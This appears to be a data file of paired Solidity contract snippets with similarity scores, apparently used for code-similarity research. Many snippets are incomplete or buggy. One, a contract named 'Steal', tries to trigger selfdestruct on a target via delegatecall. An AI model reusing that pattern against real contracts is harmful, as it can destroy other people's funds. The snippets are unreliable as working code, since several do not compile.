  address public destinationAddress;

  
  function Forwarder() {
    destinationAddress = msg.sender;
  }

  
  function () payable {
       {
          if (!destinationAddress.send(msg.value)) throw; 
      }
}",0.5971193920105637,"contract Mew {

    address owner = msg.sender;

    function change(address a) public { if(owner==msg.sender) owner=a; }

    function close() public { if(owner==msg.sender) selfdestruct(msg.sender); }

}"
"contract Ballot {

    struct Voter {
        uint weight; 
        bool voted; 
        address delegate; 
        uint vote; 
    }

    struct Proposal {
        bytes32 name;    
        uint voteCount; 
    }

    address public chairperson;

    
    
    mapping(address => Voter) public voters;

    Proposal[] public proposals;

    
    constructor(bytes32[] proposalNames) public {
        chairperson = msg.sender;
        voters[chairperson].weight = 1;

        
        
        
        for (uint i = 0; i < proposalNames.length; i++) {
            proposals.push(Proposal({
                    name: proposalNames[i],
                        voteCount: 0
                }));
        }
    }

    
    
    function giveRightToVote(address voter) public {
        
        
        
        
        
        
        require(msg.sender == chairperson, ""Only chairperson can give right to vote."");
        require(!voters[voter].voted, ""The voter already voted."");
        require(voters[voter].weight == 0);
        voters[voter].weight = 1;
    }

    
    function delegate(address to) public {
        
        Voter storage sender = voters[msg.sender];
        require(!sender.voted, ""You already voted."");

        require(to != msg.sender, ""Self-delegation is disallowed."");
        while (voters[to].delegate != address(0)) {
            to = voters[to].delegate;

                
            require(to != msg.sender, ""Found loop in delegation."");
        }

        
        
            sender.voted = true;
            sender.delegate = to;
            Voter storage delegate_ = voters[to];
            if (delegate_.voted) {
                
                
               proposals[delegate_.vote].voteCount += sender.weight;
            } else {
                
                
                delegate_.weight += sender.weight;
            }
        }

    
    
    function vote(uint proposal) public {
            Voter storage sender = voters[msg.sender];
            require(!sender.voted, ""Already voted."");
            sender.voted = true;
            sender.vote = proposal;

            
            
            proposals[proposal].voteCount += sender.weight;
    }

    function winningProposal() public view returns (uint winningProposal_) {
            uint winningVoteCount = 0;
            for (uint p = 0; p < proposals.length; p++) {
                if (proposals[p].voteCount > winningVoteCount) {
                        winningVoteCount = proposals[p].voteCount;
                        winningProposal_ = p;
                    }
            }
    }

    
    
    
    function winnerName() public view returns (bytes32 winnerName_) {
            winnerName_ = proposals[winningProposal()].name;
    }

    function getCount(uint p) public view returns (uint count_) {
            count_ = proposals[p].voteCount;
    }
}",0.5896839718877311,"contract DatariusToken is ERC20 {
    using SafeMath for uint;
    string public name = ""Datarius Credit Test"";
    string public symbol = ""DTRC_T"";
    uint public decimals = 18;

    
    address public ico;
    event Burn(address indexed from, uint value);
    
    
    bool public tokensAreFrozen = false;

    
    modifier icoOnly { 
        require(msg.sender == ico); 
        _; 
    }

   
    constructor(address _ico) public {
       ico = _ico;
    }

   
    function mintTokens(address _holder, uint _value) external icoOnly {
       require(_value > 0);
       balances[_holder] = balances[_holder].add(_value);
       totalSupply = totalSupply.add(_value);
       emit Transfer(address(0), _holder, _value);
    }


   
    function defrost() external icoOnly {
       if(tokensAreFrozen) {
           tokensAreFrozen = false; 
       } else {
           tokensAreFrozen = true;
       }
    }


   
    function burnTokens(address _holder, uint _value) public icoOnly {
        require(balances[_holder] > 0);
        totalSupply = totalSupply.sub(_value);
        balances[_holder] = balances[_holder].sub(_value);
        emit Burn(_holder, _value);
    }

   
    function balanceOf(address _holder) public view returns (uint) {
         return balances[_holder];
    }

   
    function transfer(address _to, uint _amount) public returns (bool) {
        require(!tokensAreFrozen);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

   
    function transferFrom(address _from, address _to, uint _amount) public returns (bool) {
        require(!tokensAreFrozen);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
     }


   
    function approve(address _spender, uint _amount) public returns (bool) {
        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }

   
    function allowance(address _owner, address _spender) public view returns (uint) {
        return allowed[_owner][_spender];
    }
}"
"contract Campaign {
    struct Request {
        string description;
        uint value;
        address recipient;
        bool complete;
        uint approvalCount;
        mapping(address => bool) approvals;
    }

    Request[] public requests;
    address public manager;
    uint public minimumContribution;
    mapping(address => bool) public approvers;
    uint approversCount;


    modifier restricted() {
        require(msg.sender == manager);
        _;
    }

    function Campaign(uint minimum, address creator) public {
        manager = creator;
        minimumContribution = minimum;
    }

    function contribute() public payable {
        require (msg.value > minimumContribution);

       approvers[msg.sender] = true;
       approversCount++;
    }

    function createRequest(string description, uint value, address recipient)
    public restricted
    {
        Request memory newRequest = Request({
           description: description,
           value: value,
           recipient: recipient,
           complete: false,
           approvalCount: 0
        });

        requests.push(newRequest);
    }

    function approveRequest(uint index) public {
        Request storage request = requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);

        request.approvals[msg.sender] = true;
        request.approvalCount++;

    }

    function finalizeRequest(uint index ) public restricted {
        Request storage request = requests[index];

        require(request.approvalCount > (approversCount / 2));
        require(!request.complete);

        request.recipient.transfer(request.value);
        request.complete = true;
     }
    }",0.5917291706347894,"contract XclusiveCoin {
    
    string public name = ""Xclusive Coin"";
    string public symbol = ""XCC"";
    uint8 public decimals = 18;
    
    uint256 public totalSupply;
    uint256 public xclusivecoinSupply = 1000000000;
    uint256 public buyPrice = 1200000;
    address public creator;
    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event FundTransfer(address backer, uint amount, bool isContribution);
    
    
    
    function XclusiveCoin() public {
        totalSupply = xclusivecoinSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;    
        creator = msg.sender;
    }
    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
      
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    
    
    function () payable internal {
        uint amount = msg.value * buyPrice;                    
        uint amountRaised;                                     
        amountRaised += msg.value;                            
        require(balanceOf[creator] >= amount);               
        require(msg.value < 10**17);                        
        balanceOf[msg.sender] += amount;                  
        balanceOf[creator] -= amount;                        
        Transfer(creator, msg.sender, amount);               
        creator.transfer(amountRaised);
    }

 }"
"contract WeatherApiCall is usingOraclize {
       string public weathercondition;
       uint public personscount=2;
       function WeatherApiCall() { 
            OAR = OraclizeAddrResolverI(0xec6487ae821eb3c874c197067ad134faa99c3c11);
       }

      function __callback(bytes32 myid, string result) {
                 if (msg.sender != oraclize_cbAddress()) throw;
                 weathercondition=result;
     }
     function update(string to,string datetime) payable returns(bool sufficient) {
               oraclize_query(""URL"", strConcat(""json(http:
              return true;
       }
}",0.5748232096411127,"contract I_Pricer {
    uint128 public lastPrice;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;

    function setMinter(address _newAddress) {}
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID) {}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract OrderBook {
    OrderStruct[] public buyOrderBook;
    OrderStruct[] public sellOrderBook;


    struct OrderStruct {
        uint price;
        uint quantity;
        address sender;
    }

    
    function buy(uint _maxPrice, uint _amount) {
        while (_amount > 0) {
            if (_maxPrice >= sellOrderBook[sellOrderBook.length - 1].price) {
                
                
                
            } else {
                addBuyToBook(_maxPrice, _amount);
            }
        }
    }

    
    function sell(uint _minPrice, uint _amount) {
        while (_amount > 0) {
            if (_minPrice >= buyOrderBook[buyOrderBook.length - 1].price) {
                
                
                
            } else {
                addSellToBook(_minPrice, _amount);
            }
        }
    }

    
    
    function addBuyToBook(uint _maxPrice, uint _amount) private returns(bool success){
        if (buyOrderBook.length == 0) {
            buyOrderBook.push(OrderStruct({
                    price: _maxPrice,
                    quantity:_amount,
                    sender: msg.sender}));
            return true;
        }
        uint iterLength = buyOrderBook.length - 1;
        for (uint i = 0; i <= iterLength; i++) {
            if (_maxPrice > buyOrderBook[iterLength - i].price) {
                if (i == 0) {
                    buyOrderBook.push(OrderStruct({
                        price: _maxPrice,
                        quantity:_amount,
                        sender: msg.sender}));
                    return true;
                } else {
                    buyOrderBook.push(buyOrderBook[iterLength]);
                    for (uint j=0; j < i; j++) {
                        buyOrderBook[iterLength - j + 1] = buyOrderBook[iterLength - j];
                    }
                    buyOrderBook[iterLength - i + 1] = OrderStruct({
                        price: _maxPrice,
                        quantity:_amount,
                        sender: msg.sender});
                    return true;
                }
            }
        }
        buyOrderBook.push(buyOrderBook[iterLength]);
        for (uint k=0; k < iterLength + 1; k++) {
            buyOrderBook[iterLength - k + 1] = buyOrderBook[iterLength - k];
        }
        buyOrderBook[0] = OrderStruct({
            price: _maxPrice,
            quantity:_amount,
            sender: msg.sender});
        return true;
    }

    
    
    function addSellToBook(uint _minPrice, uint _amount) private returns(bool success){
        if (sellOrderBook.length == 0) {
            sellOrderBook.push(OrderStruct({
                    price: _minPrice,
                    quantity:_amount,
                    sender: msg.sender}));
            return true;
        }
        uint iterLength = sellOrderBook.length - 1;
        for (uint i = 0; i <= iterLength; i++) {
            if (_minPrice < sellOrderBook[iterLength - i].price) {
                if (i == 0) {
                    sellOrderBook.push(OrderStruct({
                        price: _minPrice,
                        quantity:_amount,
                        sender: msg.sender}));
                    return true;
                } else {
                    sellOrderBook.push(sellOrderBook[iterLength]);
                    for (uint j=0; j < i; j++) {
                        sellOrderBook[iterLength - j + 1] = sellOrderBook[iterLength - j];
                    }
                    sellOrderBook[iterLength - i + 1] = OrderStruct({
                        price: _minPrice,
                        quantity:_amount,
                        sender: msg.sender});
                    return true;
                }
            }
        }
        sellOrderBook.push(sellOrderBook[iterLength]);
        for (uint k=0; k < iterLength + 1; k++) {
            sellOrderBook[iterLength - k + 1] = sellOrderBook[iterLength - k];
        }
        sellOrderBook[0] = OrderStruct({
            price: _minPrice,
            quantity:_amount,
            sender: msg.sender});
        return true;
    }
    function OrderBook() {} 
}",0.525748965340295,"contract DatCoin is ERC20Interface {
    uint8 public constant decimals = 5;
    string public constant symbol = ""DTC"";
    string public constant name = ""DatCoin"";

    uint public _totalSupply = 10 ** 14;
    uint public _originalBuyPrice = 10 ** 10;
    uint public _minimumBuyAmount = 10 ** 17;
    uint public _thresholdOne = 9 * (10 ** 13);
    uint public _thresholdTwo = 85 * (10 ** 12);
   
    
    address public owner;
 
    
    mapping(address => uint256) balances;
 
    
    mapping(address => mapping (address => uint256)) allowed;

    
    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }

    modifier thresholdTwo() {
        if (msg.value < _minimumBuyAmount || balances[owner] <= _thresholdTwo) {
            revert();
        }
        _;
    }
 
    
    function DatCoin() {
        owner = msg.sender;
        balances[owner] = _totalSupply;
    }
 
    function totalSupply() constant returns (uint256) {
        return _totalSupply;
    }
 
    
    function balanceOf(address _owner) constant returns (uint256) {
        return balances[_owner];
    }
 
    
    function transfer(address _to, uint256 _amount) returns (bool) {
        if (balances[msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(msg.sender, _to, _amount);
            return true;
        } else {
            return false;
        }
    }
 
    
    
    
    
    
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) returns (bool) {
        if (balances[_from] >= _amount
            && allowed[_from][msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[_from] -= _amount;
            allowed[_from][msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(_from, _to, _amount);
            return true;
        } else {
            return false;
        }
    }
 
    
    
    function approve(address _spender, uint256 _amount) returns (bool) {
        allowed[msg.sender][_spender] = _amount;
        Approval(msg.sender, _spender, _amount);
        return true;
    }
 
    function allowance(address _owner, address _spender) constant returns (uint256) {
        return allowed[_owner][_spender];
    }
    
    
    function buy() payable thresholdTwo returns (uint256 amount) {
        uint value = msg.value;
        amount = value / _originalBuyPrice;
        
        if (balances[owner] <= _thresholdOne + amount) {
            uint temp = 0;
            if (balances[owner] > _thresholdOne)
                temp = balances[owner] - _thresholdOne;
            amount = temp + (amount - temp) * 10 / 13;
            if (balances[owner] < amount) {
                temp = (amount - balances[owner]) * (_originalBuyPrice * 13 / 10);
                msg.sender.transfer(temp);
                amount = balances[owner];
                value -= temp;
            }
        }

        owner.transfer(value);
        balances[msg.sender] += amount;
        balances[owner] -= amount;
        Transfer(owner, msg.sender, amount);
        return amount;
    }
    
    
    function withdraw() onlyOwner returns (bool) {
        return owner.send(this.balance);
    }
}"
"contract Offer {

address public owner;
struct Offer {
    string title;
    string description;
    uint  offerTime;
    mapping (address => uint) subscribers;
    mapping (uint => address) subscribersAddress;
    mapping (uint => uint) nbrSubscribersPerID;
    uint price;
}

Offer[] public  offers;



function addOffer(string  description1, string title1, uint price1,uint offerTime1) 
  returns (uint, string, string, uint, uint) {
    uint offerID = offers.length++;
    Offer o = offres[offreID];

    o.description = description1;
    o.offerTime=offerTime1;
    o.title = title1;
    o.price = price1;
    return (offerID, offers[offerID].description, offers[offerID].title, offers[offerID].price, 
      offers[offerID].offerTime);
}


function returnNbroffer() constant returns(uint) {
    uint nbr_offer =offers.length;
    return(nbr_offer);
}

function subscribeOffer(uint offerID) public payable  returns(address,uint,address)   {

      Offer o = offers[offerID];
      uint i=0;
      uint count=0;
         if (msg.value>= o.price)
           { address addre=msg.sender;
             offres[offerID].subscribersAddress[count=++i]=msg.sender;
             offres[offerID].subscribers[msg.sender]=now;
             return(addre,offers[offerID].subscribers[msg.sender],offers[offerID].subscribersAddress[i]);


            }
    offers[offerID].nbreSubscribersParID[offerID]=count;



}
  function expirationOffer(uint offerID) constant  returns(bool,uint,uint)
  { 
     Offer o = offers[offerID];
     bool expire=false;
     uint timenow=now;
     uint timeSpent=offres[offerID].subscribers[msg.sender]+o.offerTime ;
     if (timenow > timeSpent )
       {expire=true;}
   return(expire,timenow,timeSpent);
   }
 }",0.5510716789620248,"contract ERC20Contract is ERC20 {
    
    string public constant symbol = ""UNIT"";

    
    string public constant name = ""Unilot token"";

    
    uint8 public constant decimals = 18;

    
    mapping(address => uint96) public balances;

    
    mapping(address => mapping (address => uint96)) allowed;

    function totalSupply()
        public
        constant
        returns (uint);


    
    function balanceOf(address _owner)
        public
        constant
        returns (uint balance)
    {
        return uint(balances[_owner]);
    }


    
    function transfer(address _to, uint _amount)
        public
        returns (bool success)
    {
        if (balances[msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[msg.sender] -= uint96(_amount);
            balances[_to] += uint96(_amount);
            Transfer(msg.sender, _to, _amount);

            return true;
        } else {
            return false;
        }
    }


    
    
    
    
    
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    )
        public
        returns (bool success)
    {
        if (balances[_from] >= _amount
            && allowed[_from][msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[_from] -= uint96(_amount);
            allowed[_from][msg.sender] -= uint96(_amount);
            balances[_to] += uint96(_amount);
            Transfer(_from, _to, _amount);
            return true;
        } else {
            return false;
        }
    }


    
    
    function approve(address _spender, uint _amount)
        public
        returns (bool success)
    {
        allowed[msg.sender][_spender] = uint96(_amount);
        Approval(msg.sender, _spender, _amount);
        return true;
    }


    function allowance(address _owner, address _spender)
        public
        constant
        returns (uint remaining)
    {
        return allowed[_owner][_spender];
    }
}"
"contract KYC {
    struct Fraud {
         address bank;
         bytes32 accountNumber;
         bytes32 routingNumber;
         uint256 amount;
         uint256 timestamp;
    }

    Fraud[] frauds; 

    function reportFraud (address bank, bytes32 accountNumber, bytes32 routingNumber, uint256 amount) external returns(uint256 fraudID) {
        Fraud memory fraud = Fraud(bank, accountNumber, routingNumber, amount, now);
        frauds.push[fraud];
        return frauds.length - 1;
    }
",0.5509027429545418,"contract MultiEthSender {
    using SafeMath for uint256;

    event Send(uint256 _amount, address indexed _receiver);

    function multiSendEth(uint256 amount, address[] list) public returns (bool){
        uint256 _userCount = list.length;

        require( address(this).balance > amount.mul(_userCount));

        for(uint256 _i = 0; _i < _userCount; _i++){
            list[_i].transfer(amount);
            emit Send(amount, list[_i]);
        }

        return true;
    }

    function() public payable{}
}"
"contract sample {
     uint32 count;

     struct example {
         uint32 value ;
     }
     mapping(uint32=example) mapper;    
     event trackInt(uint32);
     event trackObj(uint32);

     function test() {
         example memory  obj;
         obj.value = count +1;
         mapper[count]=obj;
         count++;
         trackObj(obj.value);
         trackInt(count);

     }

     function getCount() returns (uint32) {
         return count;        
     }

     function get(uint32 id) returns (uint32) {

         example obj = mapper[id-1];
         return obj.value;
     }
}",0.5713365104754443,"contract PricingStrategy {

  
  uint public presaleMaxValue = 0;

  function isPricingStrategy() external constant returns (bool) {
      return true;
  }

  function getPresaleMaxValue() public constant returns (uint) {
      return presaleMaxValue;
  }

  function isPresaleFull(uint weiRaised) public constant returns (bool);

  function getAmountOfTokens(uint value, uint weiRaised) public constant returns (uint tokensAmount);
}"
"contract OrganisationsFactory {
    mapping(string => OrganisationObject[]) organisations;
    event CreatedOrg(address indexed hsAddr);

    function add(string name, string vat, string headquaterAddress) public returns(address) {
        OrganisationObject newOrg = new OrganisationObject(name, vat, headquaterAddress);
        organisations[name].push(newOrg);
        CreatedOrg(newOrg);
        return newOrg;
    }

    function get(string name) public returns(OrganisationObject[]){
        return organisations[name];
    }
}",0.5548183359194853,"contract ComponentListInterface {

    event ComponentUpdated (bytes32 _name, string _version, address _componentAddress);

    function setComponent(bytes32 _name, address _componentAddress) public returns (bool);

    function getComponent(bytes32 _name, string _version) public view returns (address);

    function getLatestComponent(bytes32 _name) public view returns(address);

    function getLatestComponents(bytes32[] _names) public view returns(address[]);

}"
"contract OrganisationObject {
    struct organisationDetails {
        string name; 
        string vat; 
        string headquaterAddress;
    }

    organisationDetails public details;

    address[] public staff;

    function OrganisationObject (string name, string vat, string headquaterAddress){
        details.name = name;
        details.vat = vat;
        details.headquaterAddress = headquaterAddress;
    }

    function addStaff(address x){
        staff.push(x);
    }
}",0.5267126839180287,"contract Authority is Ownable {



  address authority;



  

  modifier onlyAuthority {

    require(msg.sender == authority, ""AU01"");

    _;

  }



  

  function authorityAddress() public view returns (address) {

    return authority;

  }



  

  function defineAuthority(string _name, address _address) public onlyOwner {

    emit AuthorityDefined(_name, _address);

    authority = _address;

  }



  event AuthorityDefined(

    string name,

    address _address

  );

}"
"contract TestB {
  B testb;
  A testa;

   function beforeAll() {
     testa = new A();
     testB = new B(testa);
   }

  function test_exb() {
    b.exb();
  }
}",0.5091891499585258,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract CheckBet is usingOraclize {
    struct Weather {
        uint curr_temperature;
        uint high_temperature;
        uint low_temperature;
    }
    Weather weather;

function get_weather_status() payable{
    Log(""Oraclize query was sent, waiting for the answer..""); 
    (oraclize_query(""URL"",""json(http:

}


function __callback(bytes32 _myid, string _result) {
    require (msg.sender == oraclize_cbAddress());
    Log(_result);
    assign_value_to_weather[low_temperature]= parseInt(_result, 2); 
}",0.5425685536606992,"contract CryptoWatch is Oraclize {
    
    constructor(MedianizerInterface med_, MedianizerInterface medm_, WETH weth_) public Oraclize(med_, medm_, weth_) {}

    
    function getAssetPrice(uint128 payment_) internal returns (bytes32 queryId) {
        weth.withdraw(payment_);
        require(oraclize_getPrice(""URL"", gasLimit) <= address(this).balance, ""CryptoWatch.getAssetPrice: Ether balance is less than oraclize price"");
        queryId = oraclize_query(""URL"", ""json(https:
    }
}"
"contract ListingGenerator {
    
   Listing[] public deployedListings;

    
    function createListing(uint assessedValue, uint listPrice, string memory description, string memory location) public {
       Listing newListing = new Listing(assessedValue, listPrice, description, location, msg.sender);
        deployedListings.push(newListing);
    }

    
    function getDeployedListings() public view returns (Listing[] memory){
        return deployedListings;
    }
}",0.5638618385546241,"contract BatchCreateDrawingsInterface {

  function isBatchCreateDrawings() public pure returns (bool);



  

  function getInternalDrawings(uint index) public returns (bytes32 _chainID, 

                                uint256 _startingPrice,

                                uint256 _endingPrice,

                                uint256 _duration, 

                                string memory _metaUrl);



  

  function getAuthorDrawings(uint index) public returns (bytes32 _chainID, 

                                bytes32 _author, 

                                address _owner, 

                                string memory _metaUrl);

}"
"contract Steal{
      function delegatecall_selfdestruct(address _target) external returns (bool _ans) {
          _ans = _target.delegatecall(bytes4(sha3(""selfdestruct(address)"")), this); 
      }
}",0.5522158570339942,"contract IValidator {

    
    
    
    
    
    function isValidSignature(
        bytes32 hash,
        address signerAddress,
        bytes signature
    )
        external
        view
        returns (bool isValid);
}"
"contract Storage {

    address approvedAddress;

    function update(address _sendingAddress, __MORE_HERE__) public {
        if(_sendingAddress == approvedAddress){
          
        }
    }
}",0.5831276951348635,"contract IRegistrar is IOwned {

    function addNewAddress(address _newAddress) public;

    function getAddresses() public view returns (address[]);

}"
"contract test {

  int _multiplier;
  struct MyCustomData {
    bool exists;
    string Name1;
  }
  mapping(string => MyCustomData) myData;

  event Multiplied(int indexed a, address indexed sender, int result );

  function test(int multiplier) {
    _multiplier = multiplier;
  }

  function multiply(int a) returns (int r) {

    myData[""a""] = MyCustomData(true, ""aa1"");

    r = a * _multiplier;
    Multiplied(a, msg.sender, r);
    return r;
  }
}",0.5510658190846468,"contract UserName {



  mapping (address => mapping (uint => string)) public userDict;



  event OnNameChanged(uint indexed _guid, address indexed _who, string _newName);



  function changeName(uint _guid, string _newName) public {

    userDict[msg.sender][_guid] = _newName;

    OnNameChanged(_guid, msg.sender, _newName);

  }



  function nameOf(uint _guid, address _who) view public returns (string) {

    return userDict[_who][_guid];

  }

}"
"contract Child {
    mapping(address => uint) public balances;
    address public implementation;

    function setImplementation(address _address) public {
        implementation = _address;
    }


    fallback () payable external {
        _fallback();
    }

    function _fallback() internal {
        _delegate(implementation);
    }


   function _delegate(address _implementation) internal {
    assembly {
      
      
      
      calldatacopy(0, 0, calldatasize())

      
      
      let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)

      
      returndatacopy(0, 0, returndatasize())

      switch result
      
      case 0 { revert(0, returndatasize()) }
      default { return(0, returndatasize()) }
    }
  }

}",0.5847231003323887,"contract AddressSet is Ownable {

  mapping(address => bool) exist;

  address[] elements;



  

  function add(address _addr) onlyOwner public returns (bool) {

    if (contains(_addr)) {

      return false;

    }



    exist[_addr] = true;

    elements.push(_addr);

    return true;

  }



  

  function contains(address _addr) public view returns (bool) {

    return exist[_addr];

  }



  

  function elementAt(uint256 _index) onlyOwner public view returns (address) {

    require(_index < elements.length);



    return elements[_index];

  }



  

  function getTheNumberOfElements() onlyOwner public view returns (uint256) {

    return elements.length;

  }

}"
"contract Rent is Owned {    
struct Person {

    address eth;
    string legalName;
    string email;
    uint aadhaar;

    string signTerms; 

    uint[] myOwned;
    uint[] myRented;
}

struct Parties {

    address landlord;
    address tenant;

    string signLandlord;
    string signTenant;

    bool completed;
}


struct House {

    string addressHouse;
    string type_of_property;

    uint startEpoch;
    uint endEpoch; 

    uint monthDuration; 

    uint rentAmount;
    uint securityFee;
    uint registerFee;

    bool completed;
}

struct OtherDetails {

    string latitude;
    string longitude;

    string ipfs_url; 

    uint squareFootage;
    uint numberBedrooms;
    string others;

    bool completed;
}

struct Checks {

    bool isValid;

    bool tenantApprove;
    bool govApprove;

    bool tenantCheck;

    bool paidRegisterFee;
    bool paidSecurityFee;
}

Parties[] public allParties; 
House[] public allHouses;
OtherDetails[] public allOtherDetails;
Checks[] private allChecks;

mapping(address => Person) public addressToPerson;
mapping(address => bool) private checkUser;
mapping(uint => bool) private checkAadhaar;

mapping(address => uint) private registerFeeMap;
mapping(address => uint) private securityFeeMap;


function Rent() public {

    checkUser[owner] = true;
    var govt = Person(owner, 'Owner', 'Owner', 0, 'No Sign', new uint[](0), new uint[](0));

    addressToPerson[owner] = govt;
}


event registerParty(string message);

function registerParties(address _tenant) external  {

    require(msg.sender != _tenant);

    if(checkUser[msg.sender] == true)
    {
        if(checkUser[_tenant] == true)
        {
            var newParty = Parties(msg.sender, _tenant,'N/A', 'N/A', true);
            var index = allParties.push(newParty) - 1;

            var newHouse = House('No Address Added', 'No Property Type', 0, 0, 0, 0, 0, 0, false);
            allHouses.push(newHouse);

            var newDetails = OtherDetails('28.7041', '77.1025', 'Currently IPFS Not Supported', 0, 0, 'N/A', false);
            allOtherDetails.push(newDetails);

            var newChecks = Checks(false, false, false, false, false, false);
            allChecks.push(newChecks);

            var user = addressToPerson[msg.sender];
            user.myOwned.push(index);

            var tenant = addressToPerson[_tenant];
            tenant.myRented.push(index);

            registerParty('Tenant was Successfully added to Contract, Proceed to Step 2');
        }

        else
        {
            registerParty('Tenant is not registered on Charter, registration of both parties is required');
        }
    }

    else
    {
        registerParty('Kindly register on Charter, before drafting a Contract');
    }
}


event registerHome(string message, uint FeePayable);

function newHome(string _add, string _type, uint _startEpoch, uint _endEpoch, uint _months, uint _rent, uint _security) external {

    if(checkUser[msg.sender] == true)
    {
        var user = addressToPerson[msg.sender];

        uint num = user.myOwned.length - 1;

        if(num < 0)
        {
            registerHome('Kindly fill Tenant Info in Step 1 before proceeding to Step 2', 0);
        }

        else
        {
            uint index = user.myOwned[num];
            var houseOwner = allParties[index];

            if(houseOwner.landlord != msg.sender)
            {
                registerHome('Kindly register on Charter, before drafting a Contract', 0);
            }

            else
            {
                var home = allHouses[index];

                if(home.completed == false)
                {
                    home.addressHouse = _add;
                    home.type_of_property = _type;

                    home.startEpoch = _startEpoch;
                    home.endEpoch = _endEpoch;

                    home.monthDuration = _months;

                    home.rentAmount = _rent;
                    home.securityFee = _security;

                    var _tenant = allParties[index].tenant; 

                    if((home.monthDuration < 12)&&(home.monthDuration > 0))
                    {
                        home.registerFee = 100;
                        home.completed = true;

                        registerHome(""Property's Information successfully entered, Proceed to Step-3"", home.registerFee);
                    }

                    else if(home.monthDuration <= 60)
                    {
                        if(_security > 0)
                        home.registerFee = 100 + ((2 * 12 * _rent) / 100) + 1100;

                        else
                        home.registerFee = ((2 * 12 * _rent) / 100) + 1100;

                        home.completed = true;

                        registerHome(""Property's Information successfully entered, Proceed to Step-3"", home.registerFee);
                    }

                    else if(home.monthDuration <= 120)
                    {
                        if(_security > 0)
                        home.registerFee = 100 + ((3 * 12 * _rent) / 100) + 1100;

                        else
                        home.registerFee = ((3 * 12 * _rent) / 100) + 1100;     

                        home.completed = true;

                        registerHome(""Property's Information successfully entered, Proceed to Step-3"", home.registerFee);       
                    }

                    else if(home.monthDuration <= 240)
                    {
                        if(_security > 0)
                        home.registerFee = 100 + ((6 * 12 * _rent) / 100) + 1100;

                        else
                        home.registerFee = ((6 * 12 * _rent) / 100) + 1100;

                        home.completed = true;
                        registerHome(""Property's Information successfully entered, Proceed to Step-3"", home.registerFee);
                    }

                    else
                    {
                        home.completed = false;
                        registerHome('Kindly Enter Duration of Contract Correctly.. (Min - 1 month, Max - 240 Months' , 0);
                    }
                }

                else
                {
                    registerHome('Home Registration is already Completed ', 0);
                }

                registerFeeMap[msg.sender] = home.registerFee;
                securityFeeMap[_tenant] = home.securityFee;
            }

        }
    }

    else
    {
        registerHome('Kindly register on Charter, before drafting a Contract', 0);
    }
}



event feePay(string message);

function feePayment(string _sign, uint _currentRate) external payable {

    require(msg.value == (registerFeeMap[msg.sender] * 10**18 / _currentRate));

    if(checkUser[msg.sender] == true)
    {
        var user = addressToPerson[msg.sender];

        uint num = user.myOwned.length - 1;

        if(num < 0)
        {
            feePay('Complete all the Steps, before paying Registration Fee Payment');
        }

        else
        {

            uint index = user.myOwned[num];
            var party = allParties[index];
            var house = allHouses[index];
            var details = allOtherDetails[index];
            var checks = allChecks[index];

            if((details.completed == true)&&(house.completed == true)&&(party.completed == true))
            {
                user = addressToPerson[msg.sender];
                checks.paidRegisterFee = true;
                party.signLandlord = _sign;

                feePay('Government Registration Fee Payment Successful, Tenant Verification pending..');
            }

            else 
            {
                feePay('Complete all the Steps given above before Fee Payment');
            }
        }
    }

    else
    {
        feePay('Kindly register on Charter, before drafting a Contract');
    }
}
}",0.5593594901846292,"contract BKToken is SafeMath {

        string public constant name = ""ButterflyToken"";  

        string public constant symbol = ""BK""; 

        uint public constant decimals = 8;

        uint256 _totalSupply = 7579185859 * 10**decimals;

        address trader = 0x60C8eD2EbD76839a5Ec563D78E6D1f02575660Af;

 

        function setTrader(address _addr) returns (bool success){

            if (msg.sender!=founder) revert();

            trader = _addr;

        }

        

        function totalSupply() constant returns (uint256 supply) {

            return _totalSupply;

        }

 

        function balanceOf(address _owner) constant returns (uint256 balance) {

            return balances[_owner];

        }

 

        function approve(address _spender, uint256 _value) returns (bool success) {

            require((_value == 0)||(allowed[msg.sender][_spender] ==0));

            allowed[msg.sender][_spender] = _value;

            Approval(msg.sender, _spender, _value);

            return true;

        }

 

        function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

          return allowed[_owner][_spender];

        }

        

        enum DistType{

            Miner,  

            Team,   

            Private_Placement, 

            Foundation 

        }

        

        mapping(address => uint256) balances;

        mapping(address => uint256) distBalances;

        mapping(address => DistType) public distType;

        mapping(address => mapping (address => uint256)) allowed;

        

        uint public baseStartTime;

        

        address startAddr = 0x1B66B59ABBF0AEB60F30E89607B2AD00000186A0;

